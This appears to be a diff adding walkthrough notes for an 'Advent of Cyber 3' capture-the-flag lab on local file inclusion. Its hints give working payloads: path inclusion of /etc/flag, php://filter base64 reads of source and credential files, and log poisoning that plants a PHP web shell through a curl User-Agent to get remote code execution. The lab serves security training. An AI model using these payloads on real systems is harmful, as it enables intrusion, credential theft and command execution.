@@ -1,0 +1,28 @@
+Advent of Cyber 3 - Day 6 {Web Exploitation- Patch Management Is Hard}
+
+LFI (Local File Inclusion)
+
+Question 1: Deploy the attached VM and look around. What is the entry point for our web application? 
+{Hint: Check parameters in the URL}
+
+Question 2: Use the entry point to perform LFI to read the /etc/flag file. What is the flag?
+{Hint: err=/etc/flag}
+
+Question 3: Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?
+{Hint: err=php://filter/convert.base64-encode/resource=index.php
+Save the output to a text file.
+"base64 --decode file.txt" to decode and get flag}
+
+Question 4: Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. 
+What are the username and password?
+{Hint: err=php://filter/convert.base64-encode/resource=./includes/creds.php
+Decode}
+
+Question 5: Use the credentials to login into the web application. Help McSkidy to recover the server's password. 
+What is the password of the flag.thm.aoc server? 
+{Hint: err=sensitive-data/recovery.json}
+
+Question 6: The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. 
+What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.
+{Hint: curl -A "<?php echo shell_exec(\$_GET['cmd']);?>" http://[victim IP/login.php (or any page)
+and then append this to the end of the URL: err=./includes/logs/app_access.log&cmd=cat /etc/hostname}
